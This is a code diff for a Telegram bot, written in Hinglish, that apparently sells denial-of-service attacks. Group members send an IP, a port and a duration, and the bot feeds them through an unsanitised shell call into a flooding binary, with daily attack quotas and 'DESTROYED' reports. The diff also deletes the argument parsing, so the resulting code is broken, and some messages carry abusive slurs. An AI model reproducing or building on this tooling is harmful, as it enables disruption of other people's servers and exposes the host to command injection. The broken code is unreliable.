@@ -21,13 +21,7 @@ admin_id = ["7129010361"]
 # Group and channel details
 GROUP_ID = "-1002369239894"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
-try:
-            port = int(port)
-            time_duration = int(time_duration)
-        except ValueError:
-            bot.reply_to(message, "❌ **ERROR:** PORT aur TIME integers hone chahiye!")
-            global_attack_active = False  # Reset flag
-            return
+
 # Default cooldown and attack limits
 COOLDOWN_TIME = 0  # Cooldown in seconds
 ATTACK_LIMIT = 10  # Max attacks per day
@@ -115,36 +109,21 @@ def handle_attack(message):
     # Attack start hone wala hai, flag ko True karein
     global_attack_active = True
 
-    try:
-        user_name = message.from_user.first_name
-        command = message.text.split()
-
-        if len(command) != 4:
-            bot.reply_to(message, "⚠️ **USAGE:** /attack `<IP>` `<PORT>` `<TIME>`")
-            global_attack_active = False  # Reset flag if command is incorrect
-            return
-
-        target, port, time_duration = command[1], command[2], command[3]
-
-    finally:
-        # Attack complete hone ke baad flag ko False karein
-        global_attack_active = False
-
-    if message.chat.id != int(GROUP_ID):
+if message.chat.id != int(GROUP_ID):
         bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: {CHANNEL_USERNAME}")
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **BETA CHANNEL JOIN KAR PEHLE FIR AANA** {CHANNEL_USERNAME} 🔥")
+        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** {CHANNEL_USERNAME} 🔥")
         return
 
     if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **MATHERCHOD 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐀𝐇𝐋𝐄!** 🔥\n🚀 *𝐀𝐆𝐋𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐞 𝐒𝐀𝐁𝐈𝐓 𝐊𝐑𝐎 𝐊𝐈 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈!*")
+        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐀𝐇𝐋𝐄!** 🔥\n🚀 *𝐀𝐆𝐋𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐞 𝐒𝐀𝐁𝐈𝐓 𝐊𝐑𝐎 𝐊𝐈 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈!*")
         return
 
     # Check if an attack is already running
     if is_attack_running(user_id):
-        bot.reply_to(message, "⚠️ **MATHERCOD ROK JA, 𝐄𝐊 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐇𝐀𝐋 𝐑𝐇𝐀 𝐇𝐀𝐈!** ⚡")
+        bot.reply_to(message, "⚠️ **𝐑𝐔𝐊 𝐁𝐄 𝐁𝐇𝐀𝐈, 𝐄𝐊 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐇𝐀𝐋 𝐑𝐇𝐀 𝐇𝐀𝐈!** ⚡")
         return
 
     if user_id not in user_data:
@@ -169,7 +148,7 @@ def handle_attack(message):
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
+        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 𝟏8𝟎𝐬!**")
         return
 
     # Get the user's profile picture
@@ -191,11 +170,11 @@ def handle_attack(message):
                                                         f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
                                                         f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
                                                         f"📸 **𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉 𝐃𝐄!**\n"
-                                                        f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 50%**")
+                                                        f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 0%**")
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./megoxer {target} {port} {time_duration} 900"
+    full_command = f"./Moin {target} {port} {time_duration}"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
@@ -209,8 +188,8 @@ def handle_attack(message):
                      f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!** ✅\n"
                      f"🎯 `{target}:{port}` **𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐃!**\n"
                      f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
-                     f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓??𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
-                     f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 110%**")
+                     f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
+                     f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 100%**")
 
     threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()
 
@@ -224,9 +203,9 @@ def is_attack_running(user_id):
 
 def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
     bot.send_message(message.chat.id, 
-                     f"🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 LAGALO!** ⚡")
+                     f"🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡")
     
-    bot.send_message(message.chat.id, "🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 LAGALO!** ⚡")
+    bot.send_message(message.chat.id, "🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡")
     
 @bot.message_handler(commands=['check_cooldown'])
 def check_cooldown(message):
@@ -378,7 +357,6 @@ while True:
         
         
  
-
 
 
 
